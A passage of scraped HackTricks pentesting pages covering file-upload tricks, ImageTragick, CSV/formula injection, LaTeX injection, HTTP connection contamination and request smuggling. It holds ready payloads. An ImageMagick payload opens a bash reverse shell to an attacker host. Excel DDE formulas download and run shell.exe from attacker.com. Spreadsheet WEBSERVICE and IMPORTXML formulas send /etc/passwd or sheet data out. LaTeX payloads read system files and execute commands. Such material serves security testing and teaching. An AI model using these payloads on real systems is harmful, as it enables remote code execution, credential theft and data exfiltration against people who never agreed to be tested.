40%)\nroot@s2crew:/tmp#\n3.Use a hexeditor or vi and change the ‚ÄúxxA‚Äù to ‚Äú../‚Äù, I used vi:\n:set modifiable\n:%s/xxA/..\\//g\n:x!\nDone!\nOnly one step remained: Upload the ZIP file and let the application decompress it! If it is succeeds and the web server has sufficient privileges to write the directories there will be a simple OS command execution shell on the system:\n‚Äã\n‚Äã\n‚Äã\n‚Äã\nReference\n:\nhttps://blog.silentsignal.eu/2014/01/31/file-upload-unzip/\n‚Äã\nImageTragic\nUpload this content with an image extension to exploit the vulnerability\n(ImageMagick , 7.0.1-1)\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)'\npop graphic-context\nEmbedding PHP Shell on PNG\nThe primary reason putting a web shell in the IDAT chunk is that it has the ability to bypass resize and re-sampling operations - PHP-GD contains two functions to do this\nimagecopyresized\nand\nimagecopyresampled\n.\nRead this post:\nhttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\n‚Äã\nPolyglot Files\nPolyglots, in a security context, are files that are a valid form of multiple different file types. For example, a\nGIFAR\nis both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.\nPolyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.\nThis helps to upload a file that complins with the format of several different formats. It can allows you to upload a PHAR file (PHp ARchive) that also looks like a JPEG, but probably you will still needs a valid extension and if the upload function doesn't allow it this won't help you.\nMore information in:\nhttps://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a\n‚Äã\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nLFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure\nNext\nPDF Upload - XXE and CORS bypass\nLast modified\n2mo ago"
    },
    {
        "title": "Formula/CSV/Doc/LaTeX/GhostScript Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection",
        "text": "Formula/CSV/Doc/LaTeX/GhostScript Injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nFormula Injection\nInfo\nIf your\ninput\nis being\nreflected\ninside\nCSV file\ns (or any other file that is probably going to be opened by\nExcel\n), you maybe able to put Excel\nformulas\nthat will be\nexecuted\nwhen the user\nopens the file\nor when the user\nclicks on some link\ninside the excel sheet.\nNowadays\nExcel will alert\n(several times) the\nuser when something is loaded from outside the Excel\nin order to prevent him to from malicious action. Therefore, special effort on Social Engineering must be applied to he final payload.\n‚Äã\nWordlist\n‚Äã\nDDE (\"cmd\";\"/C calc\";\"!A0\")A0\n@SUM(1+9)*cmd|' /C calc'!A0\n=10+20+cmd|' /C calc'!A0\n=cmd|' /C notepad'!'A1'\n=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0\n=cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1\nHyperlink\nThe following example is very useful to exfiltrate content from the final excel sheet and to perform requests to arbitrary locations. But it requires the use to click on the link (and accept the warning prompts).\nExample taken from\nhttps://payatu.com/csv-injection-basic-to-exploit\n‚Äã\nLet us assume an attack scenario of Student Record Management system of a school. The application allows teacher to enter details of students in the school. The attacker get access to the application and want that all the teacher using the application to get compromised. So the attacker tries to perform CSV injection attack through the web application.\nThe attacker need to steal other student‚Äôs details. So the attacker uses the Hyperlink formula ad enter it while entering student details.\nWhen the teacher export the CSV and click on the hyperlink then the sensitive data is sent to the attacker‚Äôs server.\nCSV file exported contains malicious payload in it.\nThe details of student in logged in the attackers web server.\nRCE\nFor this example to work it's\nneeded to have enable the following configuration\n:\nFile ‚Üí Options ‚Üí Trust Center ‚Üí Trust Center Settings ‚Üí External Content ‚Üí Enable Dynamic Data Exchange Server Launch\nor the use of an\nold Excel version\n.\nThe good news is that\nthis payload is executed automatically when the file is opened\n(f the user accepts the warnings).\nIt's possible to execute a calculator with the following payload\n=cmd|' /C calc'!xxx\nMore\n=\ncmd\n|\n' /C powershell Invoke-WebRequest \"http://www.attacker.com/shell.exe\" -OutFile \"$env:Temp\\shell.exe\"; Start-Process \"$env:Temp\\shell.exe\"'\n!\nA1\nLFI\nLibreOffice Calc\nThis will read the 1st line from the local /etc/passwd file:\n='file:///etc/passwd'#$passwd.A1\nEx-filtrate it:\n=WEBSERVICE(CONCATENATE(\"http://:8080/\",('file:///etc/passwd'#$passwd.A1)))\nEx-filtrate more than one line:\n=WEBSERVICE(CONCATENATE(\"http://:8080/\",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))\nDNS Exfiltration:\n=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),\"%\",\"-\")),\".\"))\nAnalyzing the DNS ex-filtration payload:\n‚Äòfile:///etc/passwd‚Äô#$passwd.A19 ‚Äì Will read the 19th line from the local /etc/passwd file\nENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) ‚Äì URL encode the returned data\nMID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) ‚Äì Similar to substring, read data from 1st character to 41st ‚Äì a very handy way to restrict the length of DNS hostnames (254 character limit on FQDN and 63 characters for a label, i.e. subdomain)\nSUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) ‚Äì replace all instances of % (the special character from URL encoding) with dash ‚Äì this is ensure that only valid DNS characters are used\nCONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.<FQDN>‚Äù) ‚Äì Concatenate the output from the file (after the above processing has taken place) with the FQDN (for which we have access to the host that is authoritative for the domain)\nWEBSERVICE ‚Äì Will make a request for this non-existent DNS name which we can then parse the logs (or run tcpdump etc.) on the DNS authoritative name server for which we have control\nGoogle Sheets OOB Data Exfiltration\nFirstly, let‚Äôs introduce some of the more interesting functions.\nCONCATENATE\n: Appends strings to one another.\n=CONCATENATE(A2:E2)\nIMPORTXML\n: Imports data from various structured data types including XML, HTML, CSV, TSV, and RSS and ATOM XML feeds.\n=IMPORTXML(CONCAT(\"http://[remote IP:Port]/123.txt?v=\", CONCATENATE(A2:E2)), \"//a/a10\")\nIMPORTFEED\n: Imports a RSS or ATOM feed.\n=IMPORTFEED(CONCAT(\"http://[remote IP:Port]//123.txt?v=\", CONCATENATE(A2:E2)))\nIMPORTHTML\n: Imports data from a table or list within an HTML page.\n=IMPORTHTML (CONCAT(\"http://[remote IP:Port]/123.txt?v=\", CONCATENATE(A2:E2)),\"table\",1)\nIMPORTRANGE\n: Imports a range of cells from a specified spreadsheet.\n=IMPORTRANGE(\"https://docs.google.com/spreadsheets/d/[Sheet_Id]\", \"sheet1!A2:E2\")\nIMAGE\n: Inserts an image into a cell.\n=IMAGE(\"https://[remote IP:Port]/images/srpr/logo3w.png\")\nLaTeX Injection\nUsually the servers that will find on the internet that\nconvert LaTeX code to PDF\nuse\npdflatex\n.\nThis program uses 3 main attributes to (dis)allow command execution:\n--no-shell-escape\n:\nDisable\nthe\n\\write18{command}\nconstruct, even if it is enabled in the texmf.cnf file.\n--shell-restricted\n: Same as\n--shell-escape\n, but\nlimited\nto a 'safe' set of\npredefined\n**commands (**On Ubuntu 16.04 the list is in\n/usr/share/texmf/web2c/texmf.cnf\n).\n--shell-escape\n:\nEnable\nthe\n\\write18{command}\nconstruct. The command can be any shell command. This construct is normally disallowed for security reasons.\nHowever, there are other ways to execute commands, so to avoid RCE it's very important to use\n--shell-restricted\n.\nRead file\nYou might need to adjust injection with wrappers as [ or $.\n\\\ninput\n{\n/etc/passwd\n}\n\\\ninclude\n{\npassword\n}\n# load .tex file\n\\\nlstinputlisting\n{\n/usr/share/texmf/web2c/texmf.cnf\n}\n\\\nusepackage\n{\nverbatim\n}\n\\\nverbatiminput\n{\n/etc/passwd\n}\nRead single lined file\n\\\nnewread\n\\\nfile\n\\\nopenin\n\\\nfile\n=\n/etc/issue\n\\\nread\n\\\nfile to\n\\\nline\n\\\ntext\n{\\\nline\n}\n\\\nclosein\n\\\nfile\nRead multiple lined file\n\\\nnewread\n\\\nfile\n\\\nopenin\n\\\nfile\n=\n/etc/passwd\n\\\nloop\n\\\nunless\n\\\nifeof\n\\\nfile\n\\\nread\n\\\nfile to\n\\\nfileline\n\\\ntext\n{\\\nfileline\n}\n\\\nrepeat\n\\\nclosein\n\\\nfile\nWrite file\n\\\nnewwrite\n\\\noutfile\n\\\nopenout\n\\\noutfile\n=\ncmd.tex\n\\\nwrite\n\\\noutfile\n{\nHello-world\n}\n\\\ncloseout\n\\\noutfile\nCommand execution\nThe input of the command will be redirected to stdin, use a temp file to get it.\n\\\nimmediate\n\\\nwrite18\n{\nenv\n>\noutput\n}\n\\\ninput\n{\noutput\n}\n‚Äã\n\\\ninput\n{\n|\n\"/bin/hostname\"\n}\n\\\ninput\n{\n|\n\"extractbb /etc/passwd > /tmp/b.tex\"\n}\n‚Äã\n# allowed mpost command RCE\n\\\ndocumentclass\n{\narticle\n}\\\nbegin\n{\ndocument\n}\n\\\nimmediate\n\\\nwrite18\n{\nmpost\n-ini\n\"-tex=bash -c (id;uname\n${\nIFS\n}\n-sm)>/tmp/pwn\"\n\"x.mp\"\n}\n\\\nend\n{\ndocument\n}\n‚Äã\n# If mpost is not allowed there are other commands you might be able to execute\n## Just get the version\n\\\ninput\n{\n|\n\"bibtex8 --version > /tmp/b.tex\"\n}\n## Search the file pdfetex.ini\n\\\ninput\n{\n|\n\"kpsewhich pdfetex.ini > /tmp/b.tex\"\n}\n## Get env var value\n\\\ninput\n{\n|\n\"kpsewhich -expand-var=\n$HOSTNAME\n> /tmp/b.tex\"\n}\n## Get the value of shell_escape_commands without needing to read pdfetex.ini\n\\\ninput\n{\n|\n\"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex\"\n}\nIf you get any LaTex error, consider using base64 to get the result without bad characters\n\\\nimmediate\n\\\nwrite18\n{\nenv\n|\nbase64\n>\ntest.tex\n}\n\\\ninput\n{\ntext.tex\n}\n\\\ninput\n|\nls\n|\nbase4\n\\\ninput\n{\n|\n\"/bin/hostname\"\n}\nCross Site Scripting\nFrom\n@EdOverflow\n‚Äã\n\\\nurl\n{\njavascript:alert\n(\n1\n)}\n\\\nhref\n{\njavascript:alert\n(\n1\n)}{\nplaceholder\n}\nGhostscript Injection\nTODO: Create a summary with the more relevant information and techniques from\nhttps://blog.redteam-pentesting.de/2023/ghostscript-overview/\n‚Äã\nReferences\n‚Äã\nhttps://notsosecure.com/data-exfiltration-formula-injection-part1\n‚Äã\n‚Äã\nhttps://0day.work/hacking-with-latex/\n‚Äã\n‚Äã\nhttps://salmonsec.com/cheatsheet/latex_injection\n‚Äã\n‚Äã\nhttps://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPDF Upload - XXE and CORS bypass\nNext\n- Pentesting Web\nHTTP Connection Contamination\nLast modified\n29d ago"
    },
    {
        "title": "HTTP Connection Contamination",
        "url": "https://book.hacktricks.xyz/pentesting-web/http-connection-contamination",
        "text": "HTTP Connection Contamination\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThe content of this post was taken from\nhttps://portswigger.net/research/http-3-connection-contamination\n****\nWeb browsers use\nHTTP connection coalescing\n, which lets them\nreuse\na single\nHTTP/2+\nconnection\nfor requests going to\ndifferent websites\n, provided that the sites\nresolve to the same IP\naddress and use a TLS certificate valid for both hostnames.\nFirst-request routing\nis a dangerous reverse-proxy behaviour where the\nproxy analyses the first request\non a connection to work out\nwhich back-end end\nto route it to, and then\nsends\nall\nsubsequent requests\non that connection to the\nsame back-end\n.\nConnection coalescing and first-request routing do not play well together\n. For example, imagine secure.example.com and wordpress.example.com are both sat behind a reverse proxy using a certificate valid for *.example.com:\n$\nnslookup\nwordpress.example.com\n52.16.179.7 // reverse proxy that supports HTTP/2 and does first-request routing\n‚Äã\n$\nnslookup\nsecure.example.com\n52.16.179.7 // same reverse proxy\n‚Äã\n$\nopenssl s_client\n-connect\nx.portswigger-labs.net:443\nsubject=/CN=*.example.com // wildcard TLS certificate\nIf a browser tries to send a\nrequest to wordpress.example.com\nfollowed by secure.example.com\n, browser connection coalescing will force\nboth requests down a single connection\nto the front-end. First-request routing will result in the\nrequest to secure.example.com incorrectly being routed to the WordPress back-end\n. This means that if you find\nXSS\non wordpress.example.com, you can use it to compromise secure.example.com!\n// create HTTP/2+ connection\nfetch\n(\n'https://wordpress.example.com/'\n,\n{\ncredentials\n:\n'include'\n})\n‚Äã\n// connection coalescing will force this down the same connection...\n// ...leading to the front-end misrouting it to WordPress\n// the browser thinks our injected JS is coming from secure.example.com\n// exposing saved passwords, cookies, etc.\nlocation\n=\n'https://secure.example.com/plugin/x?q=<script>stealPasswords()'\nYou can\nexplore connection coalescing for yourself\nby using the\nTiming graph under the Network tab in Chrome's developer tools\n(or using WireShark if you're a masochist). Issue request pairs using fetch() and see if the graph shows time spent on 'Initial connection' for the second request, and if the Connection ID column matches:\nfetch\n(\n'//sub1.hackxor.net/'\n,\n{\nmode\n:\n'no-cors'\n,\ncredentials\n:\n'include'\n}).\nthen\n(()\n=>\n{\nfetch\n(\n'//sub2.hackxor.net/'\n,\n{\nmode\n:\n'no-cors'\n,\ncredentials\n:\n'include'\n})\n})\nI haven't invested the time required to explore this threat in depth or scan for it in the wild as I believe it's currently rare for two reasons. Firstly, first-request routing is relatively uncommon and HTTP/2's implementation complexity means there's only a small pool of unique HTTP/2 servers relative to HTTP/1.1. Secondly, connection coalescing means HTTP/2 servers performing first-request routing may intermittently break for genuine visitors, so the owners may end up fixing the vulnerability without attacker encouragement.\nThat said, it's not all bad news for attackers.\nHTTP/3 proposes\nremoving the requirement for an IP address match\n, which will expose everyone with a front-end that uses first-request routing and has a certificate valid for multiple hosts\n.\nThis also creates a second risk which isn't related to first-request routing - it means a\ncompromised server with a wildcard certificate no longer requires an MITM to exploit\n. In effect, this greatly increases the pool of malicious actors who could profit from it.\nTo avoid these risks before they become a reality, ensure your reverse proxies don't perform first-request routing. You can test for this manually in Repeater by enabling HTTP/1 and HTTP/2 connection reuse, and also scan for it using the 'Connection-State' attack in\nHTTP Request Smuggler\n. Also, be aware that while wildcard TLS certificates have never been ideal, HTTP/3 means a compromised server with a wildcard certificate can now be used to attack sibling domains without an active MITM.\nThese new threats continue the ongoing trend of web infrastructure descending into a heavily intertwined mess where a weakness in any individual site has numerous non-obvious knock-on effects on the security of the overall system. It'll be interesting to see how these risks play out in practice.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nFormula/CSV/Doc/LaTeX/GhostScript Injection\nNext\n- Pentesting Web\nHTTP Connection Request Smuggling\nLast modified\n6mo ago"
    },
    {
        "title": "HTTP Connection Request Smuggling",
        "url": "https://book.hacktricks.xyz/pentesting-web/http-connection-request-smuggling",
        "text": "HTTP Connection Request Smuggling\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nConnection state attacks\nFirst-request validation\nReverse proxies often use the\nHost header\nto identify\nwhich back-end server to route\neach request to, and have a whitelist of hosts that people are\nallowed to access.\nHowever, some proxies only apply this\nwhitelist to the first request sent\nover a given connection. This means attackers can gain\naccess to internal\nwebsites by issuing a\nrequest to an allowed\ndestination,\nfollowed\nby one for the\ninternal site\ndown the same connection:\nGET / HTTP/1.1\nHost: redacted\n‚Äã\nGET / HTTP/1.1\nHost: intranet.redacted\nMercifully, this\nmistake is quite rare\n.\nFirst-request routing\nFirst-request routing occurs when the front-end uses the\nfirst request's Host header to decide\nwhich back-end to route the request to, and then\nroutes all subsequent requests\nfrom the same client connection down the\nsame back-end connection\n.\nGET / HTTP/1.1\nHost: example.com\n‚Äã\nPOST /pwreset HTTP/1.1\nHost: psres.net\nThis could be chained with\nHost header attacks\nlike password reset poisoning,\nweb cache poisoning\n, and gaining access to other virtual hosts.\nYou can scan for these two flaws using the 'connection-state probe' option in HTTP Request Smuggler.\nReferences\n‚Äã\nhttps://portswigger.net/research/browser-powered-desync-attacks\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nHTTP Connection Contamination\nNext\n- Pentesting Web\nHTTP Request Smuggling / HTTP Desync Attack\nLast modified\n6mo ago"
    },
    {
        "title": "HTTP Request Smuggling / HTTP Desync Attack",
        "url": "https://book.hacktricks.xyz/pentesting-web/http-request-smuggling",
        "text": "HTTP Request Smuggling / HTTP Desync Attack\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWhat is\nThis vulnerability occurs when a\ndesyncronization\nbetween\nfront-end proxies\nand the\nback-end\nserver allows an\nattacker\nto\nsend\nan HTTP\nrequest\nthat will be\ninterpreted\nas a\nsingle request\nby the\nfront-end\nproxies (load balance/reverse-proxy) and\nas 2 request\nby the\nback-end\nserver.\nThis allows a user to\nmodify the next request that arrives to the back-end server after his\n.\nTheory\n‚Äã\nRFC Specification (2161)\n‚Äã\nIf a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.\nContent-Length\nThe Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.\nTransfer-Encoding: chunked\nThe Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\nChunked means that large data is sent in a series of chunks\nReality\nThe\nFront-End\n(a load-balance / Reverse Proxy)\nprocess\nthe\ncontent-length\nor the\ntransfer-encoding\nheader and the\nBack-end\nserver\nprocess the other\none provoking a\ndesyncronization\nbetween the 2 systems.\nThis could be very critical as\nan attacker will be able to send one request\nto the reverse proxy that will be\ninterpreted\nby the\nback-end\nserver\nas 2 different requests\n. The\ndanger\nof this technique resides in the fact the\nback-end\nserver\nwill interpret\nthe\n2nd request injected\nas if it\ncame from the next client\nand the\nreal request\nof that client will be\npart\nof the\ninjected request\n.\nParticularities\nRemember that in HTTP\na new line character is composed by 2 bytes:\nContent-Length\n: This header uses a\ndecimal number\nto indicate the\nnumber\nof\nbytes\nof the\nbody\nof the request. The body is expected to end in the last character,\na new line is not needed in the end of the request\n.\nTransfer-Encoding:\nThis header uses in the\nbody\nan\nhexadecimal number\nto indicate the\nnumber\nof\nbytes\nof the\nnext chunk\n. The\nchunk\nmust\nend\nwith a\nnew line\nbut this new line\nisn't counted\nby the length indicator. This transfer method must end with a\nchunk of size 0 followed by 2 new lines\n:\n0\nConnection\n: Based on my experience it's recommended to use\nConnection: keep-alive\non the first request of the request Smuggling.\nBasic Examples\nSo, request smuggling attacks involve placing both the\nContent-Length\nheader and the\nTransfer-Encoding\nheader into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behaviour of the two servers:\nCL.TE\n: the front-end server uses the\nContent-Length\nheader and the back-end server uses the\nTransfer-Encoding\nheader.\nTE.CL\n: the front-end server uses the\nTransfer-Encoding\nheader and the back-end server uses the\nContent-Length\nheader.\nTE.TE\n: the front-end and back-end servers both support the\nTransfer-Encoding\nheader, but one of the servers can be induced not to process it by obfuscating the header in some way.\nCL.TE vulnerabilities\nHere, the\nfront-end\nserver uses the\nContent-Length\nheader and the\nback-end\nserver uses the\nTransfer-Encoding\nheader. We can perform a simple HTTP request smuggling attack as follows:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 30\nConnection: keep-alive\nTransfer-Encoding: chunked\n\\ `0`\\\nGET /404 HTTP/1.1\nFoo: x\nNote how\nContent-Length\nindicate the\nbodies request length is 30 bytes long\n(\nremember that HTTP uses as new line, so 2bytes each new line\n), so the reverse proxy\nwill send the complete request\nto the back-end, and the back-end will process the\nTransfer-Encoding\nheader leaving the\nGET /404 HTTP/1.1\nas the\nbeginning of the next request\n(BTW, the next request will be appended to\nFoo:x<Next request starts here>\n).\nTE.CL vulnerabilities\nHere, the front-end server uses the\nTransfer-Encoding\nheader and the back-end server uses the\nContent-Length\nheader. We can perform a simple HTTP request smuggling attack as follows:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 4\nConnection: keep-alive\nTransfer-Encoding: chunked\n\\ `7b`\\ `GET /404 HTTP/1.1`\\ `Host: vulnerable-website.com`\\ `Content-Type: application/x-www-form-urlencoded`\\ `Content-Length: 30`\\\nx=\n0\n\\\nIn this case the\nreverse-proxy\nwill\nsend the hole request\nto the\nback-end\nas the\nTransfer-encoding\nindicates so. But, the\nback-end\nis going to\nprocess\nonly the\n7b\n(4bytes) as indicated in the\nContent-Length\n.Therefore, the next request will be the one starting by\nGET /404 HTTP/1.1\nNote that even if the attack must end with a\n0\nthe following request is going to be appended as extra values of the\nx\nparameter.\nAlso note that the Content-Length of the embedded request will indicate the length of the next request that is going to b appended to the\nx\nparameter. If it's too small, only a few bytes will be appended, and if to large (bigger that the length of the next request) and error will be thrown for the next request.\nTE.TE vulnerabilities\nHere, the front-end and back-end servers both support the\nTransfer-Encoding\nheader, but one of the servers can be induced not to process it by obfuscating the header in some way.\nThere are potentially endless ways to obfuscate the\nTransfer-Encoding\nheader. For example:\nTransfer-Encoding: xchunked\n\\ `Transfer-Encoding : chunked`\\\nTransfer-Encoding: chunked\nTransfer-Encoding: x\n\\ `Transfer-Encoding: chunked`\\ `Transfer-encoding: x`\\\nTransfer-Encoding:[tab]chunked\n\\ `[space]Transfer-Encoding: chunked`\\\nX: X[\\n]Transfer-Encoding: chunked\n``\nTransfer-Encoding\n: chunked\nDepending on the server (reverse-proxy or backing) that\nstops processing\nthe\nTE\nheader, you will find a\nCL.TE vulnerability\nor a\nTE.CL vulnerability\n.\nFinding HTTP Request Smuggling\nFinding CL.TE vulnerabilities using timing techniques\nIf an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Length: 4\n‚Äã\n1\nA\n0\nSince the front-end server uses the\nContent-Length\nheader, it will forward only part of this request, omitting the\n0\n. The back-end server uses the\nTransfer-Encoding\nheader, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.\nSometimes, instead of getting a timeout you receive a 400 bad request from the final host like in the following scenario, where a CL.TE payload is sent:\nAnd the response is a redirect containing an error inside the body with even the version of the haproxy used:\nFinding TE.CL vulnerabilities using timing techniques\nIf an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Length: 6\n‚Äã\n0\nX\nSince the front-end server uses the\nTransfer-Encoding\nheader, it will forward only part of this request, omitting the\nX\n. The back-end server uses the\nContent-Length\nheader, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.\nProbing HTTP Request Smuggling vulnerabilities\nOnce 